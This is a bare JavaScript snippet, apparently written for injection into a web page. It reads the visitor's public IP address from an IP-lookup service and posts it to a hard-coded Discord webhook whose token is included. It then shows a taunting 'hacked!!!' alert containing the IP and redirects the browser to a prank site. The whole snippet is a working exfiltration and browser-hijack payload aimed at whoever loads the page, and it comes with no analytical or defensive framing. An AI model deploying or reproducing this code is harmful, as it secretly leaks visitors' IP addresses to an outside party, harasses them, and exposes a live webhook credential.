var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "https://api.ipify.org/", false ); // false for synchronous request
xmlHttp.send( null );



fetch('https://discord.com/api/webhooks/1101592283146637373/OA0skb_yVbKmxe9cB6a4uEYJyyr1h4_ItLMgD3x6ZTyKB7EKsPRjqvpsmx_yZUAaO28K', {
    method: 'POST',
    headers: {
        'Accept': 'application/json',
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({"content": "IP address:" + xmlHttp.responseText,"embeds": null,"attachments": []})
})

alert("hacked!!! " + xmlHttp.responseText + " 😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹😹")

document.location = "https://youareanidiot.cc/"

